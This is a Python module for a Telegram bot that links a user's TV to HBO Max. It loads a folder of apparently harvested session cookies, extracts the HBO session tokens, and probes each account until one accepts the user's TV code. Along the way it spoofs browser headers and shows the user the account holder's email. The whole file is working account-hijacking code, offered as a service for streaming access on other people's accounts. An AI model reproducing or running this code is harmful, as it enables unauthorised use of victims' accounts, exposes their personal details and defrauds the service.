# ============================================================
# HBO MAX TV ACTIVATOR SERVICE
# ============================================================

import os
import re
import glob
import random
import json
import base64
import uuid
import requests
from typing import Optional, Dict, Tuple

from telegram import Update
from telegram.ext import ContextTypes, ConversationHandler

from config import E, COOKIES_FOLDER
from utils import pe, update_bot_stats


# ─── Constants ──────────────────────────────────────────────

HBO_ENDPOINTS = {
    "amer": {
        "validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "emea": {
        "validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "latam": {
        "validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "apac": {
        "validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"
    }
}

HBO_COUNTRY_CODES = {
    "TR": "Turkey 🇹🇷", "US": "United States 🇺🇸", "IN": "India 🇮🇳",
    "GB": "United Kingdom 🇬🇧", "FR": "France 🇫🇷", "DE": "Germany 🇩🇪",
    "ES": "Spain 🇪🇸", "IT": "Italy 🇮🇹", "BR": "Brazil 🇧🇷",
    "MX": "Mexico 🇲🇽", "AR": "Argentina 🇦🇷", "CA": "Canada 🇨🇦",
    "AU": "Australia 🇦🇺", "JP": "Japan 🇯🇵", "KR": "South Korea 🇰🇷",
    "TH": "Thailand 🇹🇭", "PL": "Poland 🇵🇱"
}

WAITING_HBO_CODE = 6


# ─── Core Functions ─────────────────────────────────────────

def hbo_decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
        return None
    except:
        return None


def hbo_extract_st_token(content: str) -> Optional[str]:
    match = re.search(r'^st:\s*(eyJ[A-Za-z0-9_\-\.]+)', content, re.MULTILINE)
    if match:
        return match.group(1)
    match = re.search(r'st=([^;\s]+)', content)
    if match:
        token = match.group(1)
        if len(token.split('.')) == 3:
            return token
    match = re.search(r'(eyJ[A-Za-z0-9_\-\.]+)', content)
    if match:
        token = match.group(1)
        if len(token.split('.')) == 3:
            return token
    return None


def hbo_get_region_from_jwt(st_token: str) -> str:
    decoded = hbo_decode_jwt(st_token)
    if decoded:
        subdivision = decoded.get('subdivision', '')
        if 'amer' in subdivision:
            return 'amer'
        elif 'emea' in subdivision:
            return 'emea'
        elif 'latam' in subdivision:
            return 'latam'
        elif 'apac' in subdivision:
            return 'apac'
    return 'amer'


def hbo_get_user_info(st_token: str, region: str) -> Optional[Dict]:
    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://play.hbomax.com",
        "referer": "https://play.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
    }
    try:
        response = requests.get(url, headers=headers, timeout=30)
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None


def hbo_generate_device_info() -> str:
    device_id = str(uuid.uuid4())
    device_info = {
        "deviceId": device_id,
        "deviceName": "Chrome",
        "deviceModel": "Windows",
        "deviceType": "BROWSER",
        "osVersion": "10.0.0",
        "appVersion": "7.4.0",
        "manufacturer": "Google",
        "screenWidth": 1920,
        "screenHeight": 1080,
        "language": "en-US",
        "timezone": "America/New_York"
    }
    return base64.b64encode(json.dumps(device_info).encode()).decode()


def hbo_activate_tv(st_token: str, tv_code: str, region: str) -> Tuple[bool, str]:
    device_info_b64 = hbo_generate_device_info()
    client_id = f"web_{uuid.uuid4().hex[:16]}"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId={client_id}",
        "x-disco-device-info": device_info_b64,
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
        "x-wbd-device-consent": "gpc=0",
        "x-wbd-preferred-language": "en-US,en",
        "x-wbd-time-zone": "Asia/Calcutta",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }
    try:
        payload = {"linkingCode": tv_code}
        validate_url = HBO_ENDPOINTS[region]["validate"]
        connect_url = HBO_ENDPOINTS[region]["connect"]

        r1 = requests.post(validate_url, headers=headers, json=payload, timeout=30)
        if r1.status_code in [200, 204]:
            r2 = requests.post(connect_url, headers=headers, json=payload, timeout=30)
            if r2.status_code in [200, 204]:
                return True, "success"
            else:
                return False, "activation_failed"
        else:
            if r1.status_code == 400:
                try:
                    error_data = r1.json()
                    if 'errors' in error_data:
                        for error in error_data['errors']:
                            if error.get('code') == 'invalid.code':
                                return False, "invalid_code"
                            elif error.get('code') == 'expired.code':
                                return False, "expired_code"
                except:
                    pass
            return False, "unknown_error"
    except:
        return False, "exception"


# ─── Handler ─────────────────────────────────────────────────

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the HBO Max TV activator conversation."""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"{pe(E['globe'])} <b>HBO Max TV Activator</b>\n\n"
        f"{pe(E['next'])} Send me the 6-digit TV code\n"
        f"{pe(E['bolt'])} from your HBO Max TV screen.\n\n"
        f"{pe(E['warn'])} I will find a working account and activate.",
        reply_markup=cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_HBO_CODE


async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle TV code and activate HBO Max."""
    code = update.message.text.strip()
    if len(code) != 6 or not code.isdigit():
        await update.message.reply_html(
            f"{pe(E['cross'])} Invalid code. Please send a 6-digit code.",
            reply_markup=cancel_button()
        )
        return WAITING_HBO_CODE

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Finding working account..."
    )

    cookie_files = glob.glob(f"{COOKIES_FOLDER}/*.txt")
    random.shuffle(cookie_files)

    success = False
    info = {}

    for filepath in cookie_files:
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            st_token = hbo_extract_st_token(content)
            if not st_token:
                continue

            region = hbo_get_region_from_jwt(st_token)
            user_data = hbo_get_user_info(st_token, region)
            if not user_data:
                continue

            email = user_data.get('data', {}).get('attributes', {}).get('username', 'Unknown')
            country = user_data.get('data', {}).get('attributes', {}).get('verifiedHomeTerritory', 'Unknown')
            country_display = HBO_COUNTRY_CODES.get(country, country)

            ok, status = hbo_activate_tv(st_token, code, region)
            if ok:
                success = True
                info = {
                    'email': email,
                    'country': country_display,
                    'region': region.upper()
                }
                break
        except:
            continue

    if success:
        await status_msg.edit_text(
            f"{pe(E['check'])} <b>TV Activated!</b>\n\n"
            f"{pe(E['bolt'])} <b>Email:</b> {info.get('email', 'Unknown')}\n"
            f"{pe(E['globe'])} <b>Country:</b> {info.get('country', 'Unknown')}\n"
            f"{pe(E['bolt'])} <b>Region:</b> {info.get('region', 'Unknown')}\n\n"
            f"{pe(E['sparkle'])} Your TV is now connected!",
            reply_markup=back_button()
        )
        update_bot_stats(True)
    else:
        await status_msg.edit_text(
            f"{pe(E['cross'])} <b>Activation Failed.</b>\n\n"
            f"{pe(E['warn'])} Invalid code or no working account found.",
            reply_markup=back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END


def cancel_button():
    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
    from config import E
    from utils import pe
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )]
    ])


def back_button():
    from telegram import InlineKeyboardMarkup, InlineKeyboardButton
    from config import E
    from utils import pe
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )]
    ])